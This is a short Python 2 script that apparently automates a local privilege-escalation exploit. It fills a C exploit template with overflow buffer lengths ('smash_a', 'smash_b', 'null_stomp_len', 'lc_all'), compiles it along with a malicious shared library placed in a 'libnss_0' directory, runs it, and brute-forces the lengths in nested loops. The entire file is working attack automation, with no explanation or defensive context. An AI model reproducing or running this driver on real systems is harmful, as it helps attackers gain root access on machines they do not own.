import os

def exploit(i,j,k,l):
	smash_a_len = i
	smash_b_len = j
	null_stomp_len = k
	lc_all_len = l
	smash_a = "A" * smash_a_len
	smash_b = "B" * smash_b_len
	lc_all = "C" * lc_all_len
	full_len = null_stomp_len + 3

	exploit_file_tmp = open("exploit.tmp").read()
	exploit_file_tmp = exploit_file_tmp.replace("{{smash_a}}",smash_a)
	exploit_file_tmp = exploit_file_tmp.replace("{{smash_b}}",smash_b)
	exploit_file_tmp = exploit_file_tmp.replace("{{null_stomp_len}}",str(null_stomp_len))
	exploit_file_tmp = exploit_file_tmp.replace("{{lc_all}}",lc_all)
	exploit_file_tmp = exploit_file_tmp.replace("{{full_len}}",str(full_len))

	open("exploit.c","w").write(exploit_file_tmp)
	os.system("rm -rf libnss_0")
	os.system("mkdir libnss_0")
	os.system("gcc -std=c99 -o 0xd0ff9 exploit.c")
	os.system("gcc -fPIC -shared -o 'libnss_0/xd0ff999999 .so.2' lib.c")

	os.system("./0xd0ff9")


# exploit(51,52,70,200)

for i in xrange(50,53):
	for j in xrange(50,53):
		for k in xrange(69,71):
			for l in xrange(199, 201):
				exploit(i,j,k,l)
